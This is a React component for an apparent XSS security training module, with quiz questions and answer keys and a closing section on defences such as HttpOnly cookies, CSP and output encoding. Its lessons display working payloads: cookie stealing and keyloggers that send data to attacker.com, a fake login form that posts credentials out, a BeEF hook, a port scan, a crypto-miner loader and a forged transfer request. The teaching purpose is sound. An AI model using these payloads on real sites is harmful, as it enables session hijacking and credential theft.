import { useState } from "react";
import "./styles.scss";

export default function XSSExploitationTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "cookie-theft",
      title: "Cookie Stealing",
      description: "Learn how XSS can be used to steal session cookies",
      task: (
        <div className="task-box">
          <h4>Exploiting XSS for Cookie Theft</h4>
          <p className="task-intro">
            One of the most common XSS exploitation techniques is stealing user cookies
          </p>

          <div className="exploit-demo">
            <h5>Cookie Stealing Payload:</h5>
            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;document.location='http://attacker.com/steal.php?c=' + document.cookie;
                <br />
                &lt;/script&gt;
              </code>
            </div>

            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;fetch('http://attacker.com/log?cookie=' + btoa(document.cookie));
                <br />
                &lt;/script&gt;
              </code>
            </div>
          </div>

          <div className="info-box">
            <h5>What happens:</h5>
            <ul>
              <li>JavaScript executes in victim's browser</li>
              <li>document.cookie contains session tokens</li>
              <li>Cookie data sent to attacker's server</li>
              <li>Attacker can hijack the user's session</li>
            </ul>
          </div>

          <div className="warning-box">
            <p>
              <strong>Defense:</strong> Use HttpOnly flag on cookies to prevent 
              JavaScript access to sensitive session tokens.
            </p>
          </div>
        </div>
      ),
      question: "How does HttpOnly flag protect against cookie theft via XSS?",
      options: [
        "It encrypts the cookie",
        "It prevents JavaScript from accessing the cookie",
        "It deletes the cookie automatically",
        "It doesn't provide any protection",
      ],
      correct: 1,
      explanation:
        "The HttpOnly flag prevents client-side JavaScript from accessing cookies, making them immune to XSS-based cookie theft (though other XSS attacks are still possible).",
    },
    {
      id: "keylogging",
      title: "Keylogging Attack",
      description: "Capture user keystrokes using XSS",
      task: (
        <div className="task-box">
          <h4>XSS-Based Keylogger</h4>
          
          <div className="exploit-demo">
            <h5>Keylogger Payload:</h5>
            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;document.onkeypress = function(e) {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;fetch('http://attacker.com/log?key=' + e.key);
                <br />
                &nbsp;&nbsp;{'}'};
                <br />
                &lt;/script&gt;
              </code>
            </div>

            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;var keys = '';
                <br />
                &nbsp;&nbsp;document.addEventListener('keypress', function(e) {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;keys += e.key;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;if(keys.length &gt; 10) {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fetch('http://attacker.com/log', {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body: keys
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{'}'});
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;keys = '';
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;{'}'}
                <br />
                &nbsp;&nbsp;{'}'});
                <br />
                &lt;/script&gt;
              </code>
            </div>
          </div>

          <div className="impact-box">
            <p><strong>Impact:</strong></p>
            <ul>
              <li>Captures passwords as user types them</li>
              <li>Logs credit card numbers</li>
              <li>Records private messages</li>
              <li>Completely silent - no visible indication</li>
            </ul>
          </div>

          <div className="tip-box">
            <p>
              <strong>Real-world scenario:</strong> Stored XSS on a banking site 
              could capture login credentials of all users who visit the infected page.
            </p>
          </div>
        </div>
      ),
      question: "What makes keylogging via XSS particularly dangerous?",
      options: [
        "It's very loud and noticeable",
        "It silently captures sensitive data like passwords as they're typed",
        "It only works on old browsers",
        "It requires physical access",
      ],
      correct: 1,
      explanation:
        "XSS keyloggers are dangerous because they silently capture everything the user types, including passwords and sensitive data, without any visible indication to the victim.",
    },
    {
      id: "phishing-injection",
      title: "Phishing Page Injection",
      description: "Inject fake login forms to steal credentials",
      task: (
        <div className="task-box">
          <h4>XSS-Based Phishing Attack</h4>

          <div className="exploit-demo">
            <h5>Injecting Fake Login Form:</h5>
            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;document.body.innerHTML = `
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&lt;div style="text-align:center; margin-top:100px"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h2&gt;Session Expired&lt;/h2&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;Please login again&lt;/p&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form id="fake-login"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="text" placeholder="Username"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="password" placeholder="Password"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;button&gt;Login&lt;/button&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;
                <br />
                &nbsp;&nbsp;`;
                <br />
                &nbsp;&nbsp;document.getElementById('fake-login').onsubmit = function(e) {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;e.preventDefault();
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;// Send credentials to attacker
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;fetch('http://attacker.com/steal', {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body: new FormData(e.target)
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;{'}'});
                <br />
                &nbsp;&nbsp;{'}'};
                <br />
                &lt;/script&gt;
              </code>
            </div>
          </div>

          <div className="warning-box">
            <p>
              <strong>Why it works:</strong> The fake form appears on the legitimate 
              domain, making it very convincing. Users trust the URL bar!
            </p>
          </div>

          <div className="defense-box">
            <p><strong>Defense measures:</strong></p>
            <ul>
              <li>Content Security Policy (CSP)</li>
              <li>Input validation and output encoding</li>
              <li>User education about suspicious prompts</li>
            </ul>
          </div>
        </div>
      ),
      question: "Why is XSS-based phishing more effective than regular phishing?",
      options: [
        "It uses better graphics",
        "The fake form appears on the real domain, making it highly trustworthy",
        "It's easier to create",
        "It works on all websites",
      ],
      correct: 1,
      explanation:
        "XSS-based phishing is extremely effective because the malicious content appears on the legitimate domain with a valid SSL certificate, making it nearly impossible for users to detect.",
    },
    {
      id: "page-defacement",
      title: "Page Defacement",
      description: "Modify the appearance and content of web pages",
      task: (
        <div className="task-box">
          <h4>Website Defacement via XSS</h4>

          <div className="exploit-demo">
            <h5>Defacement Payloads:</h5>
            
            <div className="code-block">
              <strong>Simple Defacement:</strong>
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;document.body.innerHTML = '&lt;h1&gt;Hacked!&lt;/h1&gt;';
                <br />
                &lt;/script&gt;
              </code>
            </div>

            <div className="code-block">
              <strong>Advanced Defacement:</strong>
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;document.body.style.background = 'black';
                <br />
                &nbsp;&nbsp;document.body.innerHTML = `
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&lt;div style="color:red; font-size:50px; text-align:center;"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Site Compromised
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;
                <br />
                &nbsp;&nbsp;`;
                <br />
                &lt;/script&gt;
              </code>
            </div>

            <div className="code-block">
              <strong>Redirect Attack:</strong>
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;window.location = 'http://malicious-site.com';
                <br />
                &lt;/script&gt;
              </code>
            </div>
          </div>

          <div className="impact-box">
            <p><strong>Business Impact:</strong></p>
            <ul>
              <li>Reputation damage</li>
              <li>Loss of customer trust</li>
              <li>Financial losses</li>
              <li>Legal consequences</li>
            </ul>
          </div>
        </div>
      ),
      question: "What is the primary business impact of successful XSS defacement?",
      options: [
        "Improved website design",
        "Severe reputation damage and loss of customer trust",
        "Better SEO ranking",
        "No real impact",
      ],
      correct: 1,
      explanation:
        "XSS defacement causes severe reputation damage, loss of customer confidence, and can lead to financial losses and legal issues for the affected organization.",
    },
    {
      id: "advanced-exploitation",
      title: "Advanced XSS Exploitation",
      description: "Complex attack scenarios and BeEF framework",
      task: (
        <div className="task-box">
          <h4>Advanced XSS Techniques</h4>

          <div className="advanced-techniques">
            <div className="technique-card">
              <h5>Browser Exploitation Framework (BeEF)</h5>
              <p>Full browser control and pivoting:</p>
              <div className="code-block">
                <code>
                  &lt;script src="http://attacker:3000/hook.js"&gt;&lt;/script&gt;
                </code>
              </div>
              <ul>
                <li>Complete browser control</li>
                <li>Network reconnaissance</li>
                <li>Exploit delivery</li>
                <li>Persistent access</li>
              </ul>
            </div>

            <div className="technique-card">
              <h5>Port Scanning via XSS</h5>
              <div className="code-block">
                <code>
                  &lt;script&gt;
                  <br />
                  for(let port = 1; port &lt; 1000; port++) {'{'}
                  <br />
                  &nbsp;&nbsp;fetch('http://localhost:' + port)
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;.then(() =&gt; logPort(port));
                  <br />
                  {'}'}
                  <br />
                  &lt;/script&gt;
                </code>
              </div>
              <p>Scan internal network from victim's browser</p>
            </div>

            <div className="technique-card">
              <h5>Cryptocurrency Mining</h5>
              <div className="code-block">
                <code>
                  &lt;script src="https://coinhive.com/lib/coinhive.min.js"&gt;&lt;/script&gt;
                  <br />
                  &lt;script&gt;
                  <br />
                  &nbsp;&nbsp;var miner = new CoinHive.Anonymous('your-site-key');
                  <br />
                  &nbsp;&nbsp;miner.start();
                  <br />
                  &lt;/script&gt;
                </code>
              </div>
              <p>Use victim's CPU for mining</p>
            </div>

            <div className="technique-card">
              <h5>Session Riding (CSRF via XSS)</h5>
              <div className="code-block">
                <code>
                  &lt;script&gt;
                  <br />
                  &nbsp;&nbsp;fetch('/api/transfer', {'{'}
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify({'{'}
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to: 'attacker',
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;amount: 10000
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;{'}'}),
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;credentials: 'include'
                  <br />
                  &nbsp;&nbsp;{'}'});
                  <br />
                  &lt;/script&gt;
                </code>
              </div>
              <p>Perform actions as the authenticated user</p>
            </div>
          </div>

          <div className="success-box">
            <p>
              <strong>Remember:</strong> With XSS, an attacker can do anything 
              the victim can do on that website!
            </p>
          </div>
        </div>
      ),
      question: "What makes XSS particularly dangerous in modern applications?",
      options: [
        "It only affects old browsers",
        "It allows complete control over user's browser session and can pivot to internal networks",
        "It's easy to fix",
        "It only works on HTTP sites",
      ],
      correct: 1,
      explanation:
        "XSS is extremely dangerous because it gives attackers complete control over the victim's browser session, allowing them to steal data, perform actions as the user, and even pivot to internal networks.",
    },
    {
      id: "mitigation",
      title: "XSS Prevention & Mitigation",
      description: "Learn how to properly defend against XSS attacks",
      task: (
        <div className="task-box">
          <h4>Defending Against XSS</h4>

          <div className="defense-strategies">
            <div className="defense-card">
              <h5>1. Input Validation</h5>
              <p>Whitelist acceptable input patterns:</p>
              <div className="code-block">
                <code>
                  <br />
                  const isValid = /^[a-zA-Z0-9]+$/.test(input);
                </code>
              </div>
            </div>

            <div className="defense-card">
              <h5>2. Output Encoding</h5>
              <p>Encode special characters before rendering:</p>
              <div className="code-block">
                <code>
                  <br />
                  &lt; becomes &amp;lt;
                  <br />
                  &gt; becomes &amp;gt;
                  <br />
                  " becomes &amp;quot;
                  <br />
                  ' becomes &amp;#x27;
                </code>
              </div>
            </div>

            <div className="defense-card">
              <h5>3. Content Security Policy (CSP)</h5>
              <div className="code-block">
                <code>
                  Content-Security-Policy:
                  <br />
                  &nbsp;&nbsp;default-src 'self';
                  <br />
                  &nbsp;&nbsp;script-src 'self';
                  <br />
                  &nbsp;&nbsp;object-src 'none';
                </code>
              </div>
              <p>Prevents inline scripts and unauthorized sources</p>
            </div>

            <div className="defense-card">
              <h5>4. HttpOnly & Secure Flags</h5>
              <div className="code-block">
                <code>
                  Set-Cookie: sessionid=xxx;
                  <br />
                  &nbsp;&nbsp;HttpOnly;
                  <br />
                  &nbsp;&nbsp;Secure;
                  <br />
                  &nbsp;&nbsp;SameSite=Strict
                </code>
              </div>
              <p>Protects cookies from JavaScript access</p>
            </div>

            <div className="defense-card">
              <h5>5. Use Security Libraries</h5>
              <div className="code-block">
                <code>
                  <br />
                  {'{userInput}'}
                  <br />
                  <br />
                  <br />
                  DOMPurify.sanitize(dirtyHTML)
                </code>
              </div>
            </div>
          </div>

          <div className="summary-box">
            <p><strong>Best Practices:</strong></p>
            <ul>
              <li>Always encode output based on context</li>
              <li>Implement strict CSP headers</li>
              <li>Use modern frameworks with auto-escaping</li>
              <li>Never trust user input</li>
              <li>Regular security testing and code review</li>
            </ul>
          </div>
        </div>
      ),
      question: "What is the most effective defense against XSS?",
      options: [
        "Disabling JavaScript entirely",
        "Proper output encoding/escaping + CSP + input validation",
        "Using only HTTP (not HTTPS)",
        "Hiding the website",
      ],
      correct: 1,
      explanation:
        "Defense-in-depth approach is most effective: proper output encoding based on context, strict Content Security Policy, input validation, and using security-focused frameworks together provide the best protection.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("exploitation");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="exploitation-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "✓" : "X") : "○"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "✓ Correct!" : "X Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button
                    onClick={handleRestart}
                    className="restart-button"
                  >
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      <div className="navigation-buttons">
        <button
          onClick={goPrev}
          disabled={currentStep === 0}
          className="nav-button prev-button"
        >
          Previous
        </button>

        {completedSteps.includes(currentStep) &&
          currentStep < steps.length - 1 && (
            <button onClick={goNext} className="nav-button next-button">
              Next
            </button>
          )}

        {completedSteps.length === steps.length && (
          <button className="nav-button complete-button">
            Phase completed!
          </button>
        )}
      </div>
    </div>
  );
}
